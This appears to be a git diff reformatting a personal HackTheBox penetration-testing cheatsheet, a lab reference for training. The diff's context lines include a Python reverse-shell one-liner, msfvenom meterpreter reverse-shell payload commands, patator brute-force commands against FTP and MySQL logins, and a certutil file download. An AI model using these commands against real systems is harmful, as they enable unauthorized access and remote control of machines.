@@ -1,7 +1,7 @@
-## **HackTheBox Cheatsheet**
+# **HackTheBox Cheatsheet**
 My personal HackTheBox Cheatsheet from any sources.
-### Table of Contents
-- Enumeration
+## Table of Contents
+- [Enumeration](#enumeration)
   - [Nmap](#nmap)
   - [AutoRecon](#autorecon)
   - [dig](#dig)
@@ -18,7 +18,7 @@ My personal HackTheBox Cheatsheet from any sources.
   - [LinPEAS](#linpeas)
   - [WinPEAS](#winpeas)
   - [pspy](#pspy)
-- Brute-force (Cracking)
+- Brute Force (Cracking)
   - [JohnTheRipper](#johntheripper)
   - [hashcat](#hashcat)
   - [Hydra](#hydra)
@@ -45,9 +45,11 @@ My personal HackTheBox Cheatsheet from any sources.
   - shootback
   - gost
   - goproxy
-### Contents
+## Contents
+### Enumeration
 #### Nmap
 Nmap ("Network Mapper") is a free and open source utility for network discovery and security auditing.\
+Source: https://nmap.org/
 ```
 nmap -sV -sC -o result.nmap <IP>
 ```
@@ -183,6 +185,7 @@ Source: https://github.com/DominicBreuker/pspy
 ```
 remote:~$ ./pspy64
 ```
+### Brute Force (Cracking)
 #### JohnTheRipper
 John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems.\
 Source: https://www.openwall.com/john/
@@ -212,6 +215,7 @@ Source: https://github.com/lanjelot/patator
 patator ftp_login user=<USER> password=FILE0 0=<WORDLIST> host=<IP/DOMAIN> -x ignore:mesg='Login incorrect.'          # brute-force ftp
 patator mysql_login user=<USER> password=FILE0 0=<WORDLIST> host=<IP/DOMAIN> -x ignore:fgrep='Access denied for user' # brute-force mysql
 ```
+### Reverse Shell
 #### Reverse Shell (Python)
 ```sh
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -281,6 +285,7 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > s
 msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf # stageless linux x86
 msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf # stageless linux x64
 ```
+### File Transfer
 #### wget
 GNU Wget is a free utility for non-interactive download of files from the Web. It supports HTTP, HTTPS, and FTP protocols, as well as retrieval through HTTP proxies.\
 Source: https://www.gnu.org/software/wget/
@@ -330,3 +335,6 @@ Source: https://docs.microsoft.com/en-us/windows-server/administration/windows-c
 ```
 certutil -urlcache -f http://192.168.1.2/putty.exe putty.exe
 ```
+### Port Forwarding
+#### ssh
+TODO
